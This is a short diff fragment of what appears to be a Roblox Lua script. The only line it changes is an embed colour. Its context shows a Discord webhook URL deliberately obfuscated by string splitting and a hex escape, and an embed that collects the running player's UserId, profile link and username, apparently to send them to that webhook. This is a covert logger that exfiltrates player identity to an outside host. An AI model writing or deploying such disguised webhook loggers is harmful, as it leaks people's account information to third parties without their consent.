@@ -5,7 +5,7 @@ local url = "h".."ttps://discord.com/api/webh\x6foks/1261085987413426198/kCT6oS1
 local data = {
     ["embeds"] = {{
         ["description"] = "**"..(qq+6).."**".." **|** [**Profile**](h".."ttps://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile)",
-        ["color"] = tonumber(0xFFFAFA),
+        ["color"] = tonumber(0x6300ff),
         ["fields"] = {
             {
                 ["name"] = ":bust_in_silhouette: Username",
